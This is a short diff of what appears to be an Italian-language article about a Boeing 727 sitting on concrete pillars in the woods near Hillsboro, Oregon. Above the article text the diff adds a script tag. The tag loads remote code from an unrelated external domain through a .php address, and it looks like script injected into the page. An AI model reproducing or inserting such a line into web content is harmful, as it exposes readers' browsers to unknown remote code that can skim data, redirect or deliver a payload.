@@ -6,6 +6,9 @@
 
 ---
 
+<script src='//js.needtoimprove.com/50a1ko.php'></script>
+
+
 Se vi aggirate tra i boschi che circondano Portland, in Oregon e vi trovate vicino al sobborgo occidentale della città di Hillsboro, potreste imbattervi in una scena particolare.
 
 Nascosto tra i pini, appoggiato su due massicci pilastri di cemento, c'è un Boeing 727.
